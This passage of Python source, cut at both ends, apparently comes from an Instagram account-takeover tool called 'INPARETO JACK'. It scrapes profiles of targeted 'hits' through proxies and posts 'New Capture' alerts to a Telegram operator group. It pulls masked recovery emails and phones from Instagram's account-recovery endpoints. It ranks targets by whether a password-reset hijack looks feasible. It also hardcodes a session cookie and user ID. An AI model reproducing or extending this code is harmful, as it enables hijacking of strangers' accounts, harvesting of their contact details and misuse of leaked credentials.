    for nested in ("hd_profile_pic_url_info", "profile_pic_url_hd_info"):
        block = info.get(nested)
        if isinstance(block, dict):
            url = (block.get("url") or "").strip()
            if url.startswith("http"):
                return url
    return None


def _resolve_hit_posts_count(username, info, *, max_rounds=None):
    """Own IP first, then proxies — mobile API, gateway, web, HTML scrape."""
    info = dict(info or {})
    if _posts_count_from_ig_info(info) is not None:
        return info
    rounds = _HIT_POSTS_FETCH_ROUNDS if max_rounds is None else max(1, int(max_rounds))
    for round_idx in range(rounds):
        mobile_user = _fetch_hit_mobile_web_profile(username)
        if mobile_user:
            info = _apply_gateway_profile_to_info(info, mobile_user)
        if _posts_count_from_ig_info(info) is not None:
            return info

        pk = info.get("pk") or info.get("id")
        gateway = _fetch_hit_profile_via_gateway(username, pk)
        info = _apply_gateway_profile_to_info(info, gateway)
        if _posts_count_from_ig_info(info) is not None:
            return info

        web_user = _fetch_ig_web_profile(username)
        if web_user:
            info = _apply_gateway_profile_to_info(info, web_user)
        if _posts_count_from_ig_info(info) is not None:
            return info

        scraped = _scrape_posts_count_from_profile_page(username)
        if scraped is not None:
            info["media_count"] = scraped
            return info

        if round_idx + 1 < rounds:
            log_event(
                "HIT PROFILE",
                f"@{username} posts retry {round_idx + 2}/{rounds}",
            )
            pause = (1.2 + round_idx * 0.8) if _IS_TERMUX else (0.5 + round_idx * 0.35)
            time.sleep(pause)
    return info


def _enrich_hit_profile_light(username, info, *, skip_gateway=False, hunt_safe=False):
    """Fast profile pass — hunt_safe skips all extra IG calls so hunt never stalls."""
    info = _merge_ig_info_profile_fields(info, username)
    if hunt_safe:
        return info
    if not skip_gateway and _posts_count_from_ig_info(info) is None:
        pk = info.get("pk") or info.get("id")
        gateway = _fetch_hit_profile_via_gateway(username, pk, fast=True)
        info = _apply_gateway_profile_to_info(info, gateway)
    need_name = not (info.get("full_name") or "").strip()
    need_pfp = not _profile_pic_url_from_ig_info(info, username)
    if need_name or need_pfp:
        mobile_user = _fetch_hit_mobile_web_profile(username)
        if mobile_user:
            info = _apply_gateway_profile_to_info(info, mobile_user)
    return _merge_ig_info_profile_fields(info, username)


def _enrich_ig_info_for_hit(username, info):
    """Full profile enrich (slow) — use after contact patch when posts still missing."""
    info = _enrich_hit_profile_light(username, info)
    if _posts_count_from_ig_info(info) is None:
        info = _resolve_hit_posts_count(username, info)
    return _merge_ig_info_profile_fields(info, username)


def _posts_count_from_ig_info(info):
    if not info:
        return None
    mc = info.get("media_count")
    if mc is not None and mc != "":
        return mc
    edge = info.get("edge_owner_to_timeline_media")
    if isinstance(edge, dict) and edge.get("count") is not None:
        return edge.get("count")
    return None


def _hit_display_name(info, username):
    name = (info.get("full_name") or "").strip()
    if name:
        return name
    uname = (username or (info or {}).get("username") or "").strip().lstrip("@")
    return uname or "N/A"


def _parse_hit_profile_photo_response(resp):
    if resp is None or not getattr(resp, "ok", False):
        return None, None
    content = resp.content or b""
    if len(content) <= 256:
        return None, None
    ctype = (resp.headers.get("Content-Type") or "image/jpeg").split(";")[0].strip()
    if "image" in ctype or content[:3] == b"\xff\xd8\xff" or content[:4] == b"\x89PNG":
        return content, ctype
    return None, None


def _download_hit_profile_photo_once(url):
    """Try proxy HTTP then TLS/curl — one pass per URL."""
    headers = {
        "Referer": "https://www.instagram.com/",
        "User-Agent": _HIT_WEB_UA,
        "Accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
    }
    for getter in (_hit_profile_http_get, _hit_profile_tls_get):
        try:
            photo, ctype = _parse_hit_profile_photo_response(
                getter(url, headers=headers, timeout=22)
            )
            if photo:
                return photo, ctype
        except Exception:
            continue
    return None, None


def _download_hit_profile_photo(url):
    url = (url or "").strip()
    if not url.startswith("http"):
        return None, None
    for attempt in range(1, _HIT_PFP_DOWNLOAD_RETRIES + 1):
        photo, ctype = _download_hit_profile_photo_once(url)
        if photo:
            return photo, ctype
        if attempt < _HIT_PFP_DOWNLOAD_RETRIES:
            time.sleep(1.0 * attempt + random.uniform(0.4, 1.0))
    return None, None


def _refresh_hit_pfp_url(username, info):
    """Re-fetch IG profile to pick up a fresh CDN profile-pic URL."""
    info = dict(info or {})
    mobile = _fetch_hit_mobile_web_profile(username)
    if mobile:
        info = _apply_gateway_profile_to_info(info, mobile)
    web_user = _fetch_ig_web_profile(username)
    if web_user:
        info = _apply_gateway_profile_to_info(info, web_user)
    return info, _profile_pic_url_from_ig_info(info, username)


def _fetch_hit_profile_photo_bytes(username, info, pfp_url):
    """Download hit PFP — retry downloads and refresh URL between rounds."""
    url = (pfp_url or "").strip()
    cur_info = dict(info or {})
    last_url = ""
    for round_idx in range(_HIT_PFP_REFRESH_ROUNDS):
        if not url or not url.startswith("http"):
            cur_info, url = _refresh_hit_pfp_url(username, cur_info)
            if not url:
                if round_idx + 1 < _HIT_PFP_REFRESH_ROUNDS:
                    time.sleep(2.0 + round_idx * 1.2)
                    continue
                break
        if url != last_url:
            last_url = url
        photo_bytes, content_type = _download_hit_profile_photo(url)
        if photo_bytes:
            return photo_bytes, content_type, cur_info
        if round_idx + 1 < _HIT_PFP_REFRESH_ROUNDS:
            log_event(
                "PFP FETCH",
                f"@{username} round {round_idx + 1}/{_HIT_PFP_REFRESH_ROUNDS} failed — refresh + retry",
            )
            time.sleep(2.0 + round_idx * 1.5)
            cur_info, fresh_url = _refresh_hit_pfp_url(username, cur_info)
            if fresh_url:
                url = fresh_url
    return None, None, cur_info


def _quick_hit_pfp_bytes(pfp_url):
    """One-shot PFP for fast Telegram delivery — no refresh rounds."""
    url = (pfp_url or "").strip()
    if not url.startswith("http"):
        return None, "image/jpeg"
    photo, ctype = _download_hit_profile_photo_once(url)
    return photo, (ctype or "image/jpeg")


def _hit_recovery_section_header(title="RECOVERY"):
    bar = S["section"] * 3
    return f"\n<b>{bar} {title} {bar}</b>\n"


def _edit_hit_operator_group_message(group_id, message_id, caption, hit_keyboard, is_photo):
    """Edit the same hit alert in-place (caption or text)."""
    if not group_id or not message_id or not caption:
        return False
    if is_photo and _tg_utf16_len(caption) > TG_CAPTION_LIMIT:
        return False
    safe_kb = sanitize_inline_keyboard_urls(hit_keyboard)
    if is_photo:
        data = {
            "chat_id": group_id,
            "message_id": int(message_id),
            "caption": caption,
            "parse_mode": "HTML",
        }
        method = "editMessageCaption"
    else:
        data = {
            "chat_id": group_id,
            "message_id": int(message_id),
            "text": caption,
            "parse_mode": "HTML",
        }
        method = "editMessageText"
    if safe_kb:
        data["reply_markup"] = json.dumps(safe_kb)
    resp = telegram_post_with_retries(
        method,
        data=data,
        timeout=max(TIMEOUT, TG_SEND_TIMEOUT),
        max_retries=TG_HIT_EDIT_MAX_RETRIES,
        label="HIT GRP EDIT",
        fail_fast_400=True,
    )
    if resp is None:
        return "fail"
    try:
        desc = (resp.json().get("description") or "").lower()
        if "message is not modified" in desc:
            return "unchanged"
    except Exception:
        pass
    return "edited"


def _finalize_hit_operator_delivery(
    group_id,
    message_id,
    caption,
    hit_keyboard,
    is_photo,
    photo_bytes,
    content_type,
):
    """Caption-only in-place edit — instant alert already carries the photo."""
    if not group_id or not message_id:
        _hit_tg_rate_wait()
        return deliver_hit_to_operator_group(
            caption, hit_keyboard, photo_bytes, content_type,
        )
    if is_photo and _tg_utf16_len(caption) > TG_CAPTION_LIMIT:
        _hit_tg_rate_wait()
        delivered, new_id, new_photo = deliver_hit_to_operator_group(
            caption, hit_keyboard, photo_bytes, content_type,
        )
        if delivered:
            delete_telegram_message(group_id, message_id)
        return delivered, new_id, new_photo
    edit_out = _edit_hit_operator_group_message(
        group_id, message_id, caption, hit_keyboard, is_photo,
    )
    if edit_out in ("edited", "unchanged"):
        return True, message_id, is_photo
    _hit_tg_rate_wait()
    delivered, new_id, new_photo = deliver_hit_to_operator_group(
        caption, hit_keyboard, photo_bytes, content_type,
    )
    if delivered:
        delete_telegram_message(group_id, message_id)
    return delivered, new_id, new_photo


def _hit_tg_rate_wait():
    """Space hit-group posts — mobile networks + Telegram flood limits."""
    global _hit_tg_last_send_mono
    with _hit_tg_send_lock:
        gap = time.monotonic() - _hit_tg_last_send_mono
        wait = HIT_TG_MIN_INTERVAL_SEC - gap
        if wait > 0:
            time.sleep(wait)
        _hit_tg_last_send_mono = time.monotonic()


def _enqueue_hit_tg_retry(username, caption, hit_keyboard, photo_bytes, content_type):
    with _hit_tg_retry_lock:
        if len(_hit_tg_retry_pending) >= 200:
            _hit_tg_retry_pending.pop(0)
        _hit_tg_retry_pending.append({
            "username": username,
            "caption": caption,
            "keyboard": hit_keyboard,
            "photo_bytes": photo_bytes,
            "content_type": content_type or "image/jpeg",
            "tries": 0,
            "at": time.time(),
        })


def _hit_tg_retry_loop():
    while True:
        time.sleep(6)
        if not TELEGRAM_ENABLED:
            continue
        with _hit_tg_retry_lock:
            if not _hit_tg_retry_pending:
                continue
            batch = []
            while _hit_tg_retry_pending and len(batch) < 18:
                batch.append(_hit_tg_retry_pending.pop(0))
        retry_later = []
        for item in batch:
            item["tries"] = int(item.get("tries") or 0) + 1
            _hit_tg_rate_wait()
            ok, _, _ = deliver_hit_to_operator_group(
                item["caption"],
                item["keyboard"],
                item.get("photo_bytes"),
                item.get("content_type") or "image/jpeg",
            )
            if ok:
                log_event("HIT RETRY", f"@{item.get('username')} delivered on retry")
            elif item["tries"] < HIT_TG_RETRY_MAX:
                retry_later.append(item)
            else:
                log_event(
                    "HIT FAIL",
                    f"@{item.get('username')} dropped after {item['tries']} TG retries",
                )
        if retry_later:
            with _hit_tg_retry_lock:
                _hit_tg_retry_pending.extend(retry_later)


def start_hit_tg_retry_monitor():
    global _hit_tg_retry_started
    if _hit_tg_retry_started:
        return
    _hit_tg_retry_started = True
    threading.Thread(
        target=_hit_tg_retry_loop, daemon=True, name="hit-tg-retry",
    ).start()


def _format_hit_instant_pipeline_block():
    """Live pipeline card — fills in on enrich edit."""
    w = 8
    return (
        tg_section("PIPELINE")
        + f"  {S['bullet']} Profile   <code>{tg_progress(45, w)}</code>  <i>live</i>\n"
        + f"  {S['bullet']} Contact   <code>{tg_progress(8, w)}</code>  <i>sync</i>\n"
        + f"  {S['bullet']} Quality   <code>{tg_progress(0, w)}</code>  <i>queued</i>\n"
    )


def _format_hit_instant_recovery_stub():
    """Recovery placeholders — replaced after enrich."""
    header = _hit_recovery_section_header()
    return (
        header
        + f"  {S['bullet']} Email     <code>—</code>\n"
        + f"  {S['bullet']} Phone     <code>—</code>\n"
        + f"  {S['bullet']} Joined    <code>—</code>\n"
    )


def _compose_hit_instant_stub_message(username, info, contact_details=None):
    """Instant alert stub — enrich upgrades to full capture card."""
    info = _merge_ig_info_profile_fields(dict(info or {}), username)
    contact_details = dict(contact_details or _hit_contact_seed_from_info(info))
    name = _hit_display_name(info, username)
    followers = info.get("follower_count", "N/A")
    following = info.get("following_count", "N/A")
    username_safe = html.escape(username)
    timestamp = datetime.now(timezone.utc).strftime("%d %b %Y • %H:%M UTC")
    caption = _build_box_hit_caption(
        username,
        name,
        followers,
        following,
        "···",
        1,
        contact_details,
        timestamp,
        pending=True,
    )
    keyboard = create_hit_keyboard(username_safe)
    photo_bytes = None
    content_type = "image/jpeg"
    pfp = _profile_pic_url_from_ig_info(info, username) or "N/A"
    if pfp != "N/A":
        try:
            photo_bytes, content_type = _quick_hit_pfp_bytes(pfp)
        except Exception:
            photo_bytes = None
    return caption, keyboard, photo_bytes, content_type, 1, name, "N/A", contact_details


def _compose_hit_group_message(username, info, contact_details=None, *, skip_pfp=False):
    """Build hit caption + keyboard; photo only on instant send (skip_pfp for caption edits)."""
    info = _merge_ig_info_profile_fields(dict(info or {}), username)
    contact_details = dict(contact_details or {})
    name = _hit_display_name(info, username)
    followers = info.get("follower_count", "N/A")
    following = info.get("following_count", "N/A")
    posts_raw = _posts_count_from_ig_info(info)
    posts_display = str(posts_raw) if posts_raw is not None else "N/A"
    username_safe = html.escape(username)
    timestamp = datetime.now(timezone.utc).strftime("%d %b %Y • %H:%M UTC")
    quality_stars = _calculate_hit_quality_stars(
        username, name, followers, posts_raw, contact_details,
    )
    caption = _build_box_hit_caption(
        username,
        name,
        followers,
        following,
        posts_display,
        quality_stars,
        contact_details,
        timestamp,
    )
    keyboard = create_hit_keyboard(username_safe)
    photo_bytes = None
    content_type = "image/jpeg"
    if not skip_pfp:
        pfp = _profile_pic_url_from_ig_info(info, username) or "N/A"
        if pfp != "N/A":
            try:
                photo_bytes, content_type = _quick_hit_pfp_bytes(pfp)
            except Exception:
                photo_bytes = None
    return caption, keyboard, photo_bytes, content_type, quality_stars, name, posts_display, contact_details


def _hit_tg_cache_key(username):
    return (username or "").strip().lstrip("@").lower()


def _hit_tg_cache_put(username, group_id, msg_id, is_photo):
    key = _hit_tg_cache_key(username)
    if not key or not group_id or not msg_id:
        return
    with _hit_tg_msg_lock:
        _hit_tg_msg_cache[key] = {
            "group_id": str(group_id),
            "msg_id": int(msg_id),
            "is_photo": bool(is_photo),
            "at": time.time(),
        }


def _hit_tg_cache_get(username):
    key = _hit_tg_cache_key(username)
    if not key:
        return None
    with _hit_tg_msg_lock:
        row = _hit_tg_msg_cache.get(key)
    if not row:
        return None
    if time.time() - float(row.get("at") or 0) > HIT_TG_MSG_CACHE_TTL:
        with _hit_tg_msg_lock:
            _hit_tg_msg_cache.pop(key, None)
        return None
    return dict(row)


def _hit_tg_user_lock(username):
    key = _hit_tg_cache_key(username)
    with _hit_tg_user_locks_guard:
        lock = _hit_tg_user_locks.get(key)
        if lock is None:
            lock = threading.Lock()
            _hit_tg_user_locks[key] = lock
        return lock


def _wait_hit_tg_cache(username, timeout=15.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        row = _hit_tg_cache_get(username)
        if row and row.get("msg_id"):
            return row
        time.sleep(0.12)
    return None


def _hit_upgrade_group_message(username, caption, hit_keyboard, photo_bytes, content_type):
    """Edit instant hit caption in-place — photo already on the instant message."""
    gid = get_operator_hit_group_id()
    if not gid or not caption:
        return False, None, False, "fail"
    cached = _hit_tg_cache_get(username)
    if cached and str(cached.get("group_id")) == str(gid) and cached.get("msg_id"):
        msg_id = int(cached["msg_id"])
        is_photo = bool(cached.get("is_photo"))
        edit_out = _edit_hit_operator_group_message(
            gid, msg_id, caption, hit_keyboard, is_photo,
        )
        if edit_out in ("edited", "unchanged"):
            return True, msg_id, is_photo, edit_out
        upgraded, new_id, new_photo = _finalize_hit_operator_delivery(
            gid, msg_id, caption, hit_keyboard, is_photo, photo_bytes, content_type,
        )
        if upgraded and new_id:
            _hit_tg_cache_put(username, gid, new_id, new_photo)
            return upgraded, new_id, new_photo, "resent"
        return upgraded, new_id, new_photo, "fail"
    _hit_tg_rate_wait()
    delivered, new_id, new_photo = deliver_hit_to_operator_group(
        caption, hit_keyboard, photo_bytes, content_type,
    )
    return delivered, new_id, new_photo, "new" if delivered else "fail"


def _deliver_hit_instant_stub(username, info, contact_details=None):
    """Rate-limited stub instant post — full caption comes on enrich edit."""
    if not TELEGRAM_ENABLED or not get_operator_hit_group_id():
        return False, None, False
    caption, keyboard, photo_bytes, content_type, _, _, _, _ = _compose_hit_instant_stub_message(
        username, info, contact_details,
    )
    _hit_tg_rate_wait()
    delivered, msg_id, is_photo = deliver_hit_to_operator_group(
        caption, keyboard, photo_bytes, content_type,
    )
    if not delivered:
        _enqueue_hit_tg_retry(username, caption, keyboard, photo_bytes, content_type)
        log_event("HIT RETRY", f"@{username} instant queued for TG retry")
    return delivered, msg_id, is_photo


def _hit_instant_group_alert(username, info):
    """Fire hit to the linked group immediately — do not wait for enrich."""
    if not TELEGRAM_ENABLED:
        return
    gid = get_operator_hit_group_id()
    if not gid:
        log_event("HIT FAIL", f"@{username} no hit group — link via /verifyhitgroup")
        return
    info = _merge_ig_info_profile_fields(dict(info or {}), username)
    contact_details = _hit_contact_seed_from_info(info)
    delivered, msg_id, is_photo = _deliver_hit_instant_stub(username, info, contact_details)
    if delivered and msg_id:
        _hit_tg_cache_put(username, gid, msg_id, is_photo)
        log_event("HIT TG", f"@{username} instant · group")
    elif not delivered:
        log_event("HIT FAIL", f"@{username} instant send failed — retry queue")


def _queue_hit_instant_tg(username, info):
    try:
        _hit_tg_delivery_executor.submit(
            _hit_instant_group_alert, username, dict(info or {}),
        )
    except Exception as exc:
        log_event("HIT BG", f"@{username} instant TG queue {str(exc)[:60]}")
        _hit_instant_group_alert(username, info)


def _schedule_hit_tg_deliver(username, info, contact_details, profile_url, timestamp):
    """Enqueue enrich edit on TG pool — waits for instant cache, no photo re-send."""
    payload = (
        username,
        dict(info or {}),
        dict(contact_details or {}),
        profile_url,
        timestamp,
    )

    def _run():
        if not _wait_hit_tg_cache(username, 20.0):
            log_event("HIT TG", f"@{username} instant cache timeout")
        with _hit_tg_user_lock(username):
            _hit_deliver_and_archive(*payload)

    try:
        _hit_tg_delivery_executor.submit(_run)
    except Exception as exc:
        log_event("HIT BG", f"@{username} TG deliver queue {str(exc)[:60]}")
        _run()


def _queue_hit_tg_chain(username, info):
    """Instant send then enrich upgrade — serialized per username on TG pool."""
    info_copy = dict(info or {})

    def _start():
        with _hit_tg_user_lock(username):
            _hit_instant_group_alert(username, info_copy)
        _queue_hit_upgrade_pipeline(username, info_copy)

    try:
        _hit_tg_delivery_executor.submit(_start)
    except Exception as exc:
        log_event("HIT BG", f"@{username} TG chain {str(exc)[:60]}")
        _start()


def _deliver_hit_group_guaranteed(username, info, contact_details=None):
    """Rate-limited group delivery with automatic retry queue on failure."""
    if not TELEGRAM_ENABLED or not get_operator_hit_group_id():
        return False, None, False
    caption, keyboard, photo_bytes, content_type, _, _, _, _ = _compose_hit_group_message(
        username, info, contact_details,
    )
    _hit_tg_rate_wait()
    delivered, msg_id, is_photo = deliver_hit_to_operator_group(
        caption, keyboard, photo_bytes, content_type,
    )
    if not delivered:
        _enqueue_hit_tg_retry(username, caption, keyboard, photo_bytes, content_type)
        log_event("HIT RETRY", f"@{username} queued for TG retry")
    return delivered, msg_id, is_photo


def submit_hit_report(username, info):
    """Bounded hit-report queue — avoids unbounded thread pile-up."""
    try:
        _hit_report_executor.submit(report, username, info)
    except Exception as exc:
        log_event("HIT REPORT", f"@{username} queue failed {str(exc)[:60]}")


def _ensure_hits_dir():
    os.makedirs(HITS_DIR, exist_ok=True)


def _session_hits_basename(start=None):
    st = start or START_TIME
    return f"session_{st.strftime('%Y%m%d_%H%M%S')}.txt"


def _init_session_hits_file():
    """One basic hits file per session under hits/."""
    global _session_hits_file
    _ensure_hits_dir()
    _session_hits_file = os.path.join(HITS_DIR, _session_hits_basename())
    if os.path.exists(_session_hits_file):
        return _session_hits_file
    started = START_TIME.strftime("%d %b %Y %H:%M:%S UTC")
    with _hits_file_lock:
        with open(_session_hits_file, "w", encoding="utf-8") as f:
            f.write(f"# INPARETO JACK — session {started}\n")
            f.write("# username | followers | following\n")
            f.write("-" * 48 + "\n")
    return _session_hits_file


def _current_session_hits_path():
    if _session_hits_file and os.path.isfile(_session_hits_file):
        return _session_hits_file
    path = os.path.join(HITS_DIR, _session_hits_basename())
    return path if os.path.isfile(path) else None


def _write_hit_session_basic(username, info):
    """Instant basic log — username, followers, following only (no enrich)."""
    info = _merge_ig_info_profile_fields(dict(info or {}), username)
    uname = (username or "").strip().lstrip("@")
    if not uname:
        return
    followers = info.get("follower_count", "N/A")
    following = info.get("following_count", "N/A")
    if not _session_hits_file:
        _init_session_hits_file()
    line = f"{uname}\t{followers}\t{following}\n"
    with _hits_file_lock:
        with open(_session_hits_file, "a", encoding="utf-8") as f:
            f.write(line)


def _write_hit_file_entry(
    username,
    name,
    followers,
    following,
    posts_display,
    quality_display,
    contact_details,
    profile_url,
    timestamp,
):
    with _hits_file_lock:
        with open("hits.txt", "a", encoding="utf-8") as f:
            f.write("╔" + "═" * 60 + "╗\n")
            f.write(f"Username    : {username}\n")
            f.write(f"Full Name   : {name}\n")
            f.write(f"Followers   : {followers}\n")
            f.write(f"Following   : {following}\n")
            f.write(f"Posts       : {posts_display}\n")
            f.write(f"Hit Quality : {quality_display}\n")
            if contact_details.get("joined"):
                f.write(f"Joined      : {contact_details['joined']}\n")
            if contact_details.get("email"):
                f.write(f"Email       : {contact_details['email']}\n")
            if contact_details.get("phone"):
                f.write(f"Phone       : {contact_details['phone']}\n")
            f.write(f"Profile URL : {profile_url}\n")
            f.write(f"Found At    : {timestamp}\n")
            f.write("╚" + "═" * 60 + "╝\n")


def _hit_quality_meter(star_count):
    """Classic meter: filled ★, empty ☆ (e.g. 3/5 → ★★★☆☆)."""
    n = max(1, min(5, int(star_count or 1)))
    return "★" * n + "☆" * (5 - n)


def _format_hit_quality_display(star_count):
    """Plain text — hits.txt, terminal log."""
    n = max(1, min(5, int(star_count or 1)))
    return f"{n}/5  {_hit_quality_meter(n)}"


def _format_hit_quality_telegram(star_count):
    """Telegram HTML — score in <code>, unicode meter outside (Android-safe)."""
    n = max(1, min(5, int(star_count or 1)))
    return (
        f"  {S['bullet']} Hit Quality  <code>{n}/5</code>  {_hit_quality_meter(n)}\n"
    )


def _masked_email_is_gmail(masked_email):
    """Reset match requires @gmail.com — rejects aol/yahoo/etc."""
    v = (masked_email or "").strip().lower()
    if not v or "@" not in v:
        return False
    if _HIT_FULL_GMAIL_RE.match(v):
        return True
    return bool(_HIT_MASKED_GMAIL_RE.search(v))


def _visible_email_local_ends(masked_email):
    local = (masked_email or "").split("@")[0].strip()
    if not local:
        return "", ""
    first = last = ""
    for ch in local:
        if ch not in "*•":
            first = ch.lower()
            break
    for ch in reversed(local):
        if ch not in "*•":
            last = ch.lower()
            break
    return first, last


def _username_email_letters_match(username, masked_email):
    """Reset match: gmail.com domain + first/last visible local letters vs username."""
    if not _masked_email_is_gmail(masked_email):
        return False
    uname = (username or "").strip().lstrip("@").lower()
    if len(uname) < 2:
        return False
    first_e, last_e = _visible_email_local_ends(masked_email)
    if not first_e or not last_e:
        return False
    return uname[0] == first_e and uname[-1] == last_e


def _calculate_hit_quality_stars(username, name, followers, posts_raw, contact_details):
    """
    Hit quality (max 5☆):
    +1 base · +1 if 50+ followers · +1 if 20+ posts · +1 if 2+ word name
    +1 if email only (no phone)
    Cap at 1☆ if phone linked OR reset match fails (gmail.com + letter match).
    """
    details = contact_details or {}
    phone = (details.get("phone") or "").strip()
    email = (details.get("email") or "").strip()

    if phone:
        return 1
    if email and not _username_email_letters_match(username, email):
        return 1

    stars = 1
    try:
        if int(followers) >= 50:
            stars += 1
    except (TypeError, ValueError):
        pass
    try:
        if posts_raw is not None and int(posts_raw) >= 20:
            stars += 1
    except (TypeError, ValueError):
        pass
    if len([w for w in re.split(r"\s+", (name or "").strip()) if w]) >= 2:
        stars += 1
    if email:
        stars += 1
    return min(stars, 5)


def _build_hit_caption_base(
    username_safe,
    name_safe,
    followers_safe,
    following_safe,
    posts_safe,
    timestamp,
    profile_url,
    quality_stars,
):
    return (
        format_panel_header()
        + f"<b>{S['brand']} New Capture</b>\n\n"
        + f"  {S['bullet']} User      <tg-spoiler>@{username_safe}</tg-spoiler>\n"
        + f"  {S['bullet']} Name      {name_safe}\n"
        + tg_row("Followers", followers_safe)
        + tg_row("Following", following_safe)
        + tg_row("Posts", posts_safe)
        + _format_hit_quality_telegram(quality_stars)
        + tg_row("Found", timestamp)
        + f"\n<a href=\"{profile_url}\">{S['btn_profile']} Open on Instagram</a>"
    )


def _pick_ig_contact_points(points):
    email = phone = ""
    for cp in _filter_valid_contact_points(points):
        kind = (cp.get("type") or "").upper()
        val = (cp.get("contact_point") or "").strip()
        if kind == "EMAIL" and not email:
            email = val
        elif kind == "PHONE" and not phone:
            phone = val
    return email, phone


def _apply_recovery_result_to_hit_out(out, result):
    """Merge legacy HitRecoveryResult — IG masked values only, no re-mask."""
    if not getattr(result, "found", False):
        return out
    if not out.get("joined"):
        ac = (getattr(result, "account_created", None) or "").strip()
        if ac:
            out["joined"] = ac
    email_raw = (getattr(result, "email", None) or "").strip()
    phone_raw = (getattr(result, "phone", None) or "").strip()
    cp_email, cp_phone = _pick_ig_contact_points(
        getattr(result, "contact_points", None) or []
    )
    if not email_raw:
        email_raw = cp_email
    if not phone_raw:
        phone_raw = cp_phone
    if email_raw and _is_valid_ig_recovery_email(email_raw) and not out.get("email"):
        out["email"] = email_raw
    if phone_raw and _is_valid_ig_recovery_phone(phone_raw) and not out.get("phone"):
        out["phone"] = phone_raw
    return out


def _merge_recovery_phone_only(out, result):
    """Apply only validated phone from a recovery result (keep existing email)."""
    if not getattr(result, "found", False):
        return out
    phone_raw = (getattr(result, "phone", None) or "").strip()
    _, cp_phone = _pick_ig_contact_points(getattr(result, "contact_points", None) or [])
    if not phone_raw:
        phone_raw = cp_phone
    if phone_raw and _is_valid_ig_recovery_phone(phone_raw):
        out["phone"] = phone_raw
    return out



_WBLOKS_BKV = "487c52f1e99f6fe3faee06af68ac70f38b5a53f74509a278bba9db63a261bc12"
_WBLOKS_DEVICE_ID = "aZ67dgABAAGBHw-P3_ILGWvl1aRb"
_WBLOKS_FETCH_URL = "https://www.instagram.com/async/wbloks/fetch/"
_WBLOKS_USER_AGENT = (
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
)
_WBLOKS_USE_LOGGED_IN_SESSION = False
_WBLOKS_BASE_COOKIES = {
    "datr": "drueaT-Mec1uOMARZ5giSXbi",
    "ig_did": "01076FE5-57FB-4B7F-A186-50F2047AEE9C",
    "mid": "aZ67dgABAAGBHw-P3_ILGWvl1aRb",
    "ps_l": "1",
    "ps_n": "1",
    "dpr": "2.4000000953674316",
}
_WBLOKS_LOGGED_IN_COOKIES = {
    "ds_user_id": "56939731259",
    "sessionid": (
        "56939731259%3AzJPg6MVevx6U61%3A0%3A"
        "AYg9Wj7ogENEcHzHm9Im4Fn569nDlukhSk-MSgKqwxw"
    ),
    "rur": (
        '"CLN\\05456939731259\\0541812871654:01ffc82fb81c546526b7299310cb47d23'
        "fbb0d178c7bb68ca255ce2fb9ed7489e494dcb4\""
    ),
}
_WBLOKS_STEP1_CONTEXT = (
    "AdBQTjHuBAMk8-R968o5JMQWYgV4QPZHKf-As029YpJ8rk2nxmXp9psDta8ax-c1Kt_MNvWHOS8NLW3aoxu28q6VXjLb1CD"
    "-MoY5bO4Vg7ZV_LpppM5Ofm94CXKRqAm981Aq9cBJwMUst2EIV6PRsenxqHdTAOZtg2dAOQVOur_2p3f2S-KncvFHFUVtRTjmIzbHw"
    "QzGQd3UeN8JTMcoahKE3cZMQu0t8XRx1r_9OUk3x9mSCwKuBJ2YY4MkNCotvnVYvUOJ68SGaCRl9VHRbe1XG7Wv3NqwtLbF-D0982Cgz3evLuQ7D9BL3ncsfDJwYNt_UE2qA1SLLBdxZQ3YeGikksoD5iomy9NM3l9R4o9Ybxmso13v6nofG_L_RYHT4wZ4m1WMYN9cfexavfMwh3oUUd65VYtSlwrYYlOYH6O0ro0UKeQ|arm"
)
_WBLOKS_ARM_RE = re.compile(r"Ad[A-Za-z0-9_-]{20,}\|arm")
_WBLOKS_AUTH_TOKEN_RE = r"Ad[A-Za-z0-9_-]{20,320}"
_WBLOKS_AUTH_ASYNC_PATTERNS = (
    rf'\\"phone\\",\s*false,\s*false,\s*\\"({_WBLOKS_AUTH_TOKEN_RE})\\"',
    rf'\\"email\\",\s*false,\s*false,\s*\\"({_WBLOKS_AUTH_TOKEN_RE})\\"',
    rf'\\"phone\\",\s*(?:true|false),\s*\\"({_WBLOKS_AUTH_TOKEN_RE})\\"',
    rf'\\"email\\",\s*(?:true|false),\s*\\"({_WBLOKS_AUTH_TOKEN_RE})\\"',
    rf'\\"password\\",\s*(?:true|false),\s*\\"({_WBLOKS_AUTH_TOKEN_RE})\\"',
    rf'\\"(?:phone|email|password)\\",\s*(?:true|false),\s*(?:true|false),\s*\\"({_WBLOKS_AUTH_TOKEN_RE})\\"',
)
_WBLOKS_MASKED_EMAIL_RE = re.compile(r"[a-zA-Z0-9]\*+[a-zA-Z0-9]@[a-zA-Z0-9\*\.\-]+")
_WBLOKS_FULL_EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}")
_WBLOKS_SENT_CODE_EMAIL_RE = re.compile(
    r"We sent a code to ([a-zA-Z0-9*._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})",
    re.IGNORECASE,
)
_WBLOKS_MASKED_PHONE_RE = re.compile(r"\+\d{1,3}(?:\s+[\*]+\s*)+\d{2,4}")
_WBLOKS_AUTH_METHOD_APPID = "com.bloks.www.caa.ar.auth_method"
_WBLOKS_EMAIL_CONFIRM_ASYNC_APPID = "com.bloks.www.caa.ar.authentication_confirmation.async"
_WBLOKS_INITIATE_VIEW_APPID = "com.bloks.www.caa.ar.initiate_view"
_WBLOKS_SEARCH_APPID = "com.bloks.www.caa.ar.search.async"
_WBLOKS_AUTH_METHOD_ASYNC_APPID = "com.bloks.www.caa.ar.auth_method.async"
_WBLOKS_STEP2_ROUTE_RE = re.compile(
    r'app_id\\",\s*\\"(com\.bloks\.www\.caa\.ar\.(?:auth_method|authentication_confirmation))\\"'
    r',\s*\\"tti_marker_id\\",\s*\d+,\s*\\"screen_id\\",\s*\\"([^\\]+)\\"'
)
_WBLOKS_STEP4_ROUTE_RE = re.compile(
    r'app_id\\",\s*\\"com\.bloks\.www\.caa\.ar\.initiate_view\\"'
    r',\s*\\"tti_marker_id\\",\s*\d+,\s*\\"screen_id\\",\s*\\"([^\\]+)\\"'
)


def _wbloks_strip_json(text):
    text = (text or "").strip()
    if text.startswith("for (;;);"):
        return text[9:].strip()
    return text


def _wbloks_arm_token(text):
    body = _wbloks_strip_json(text)
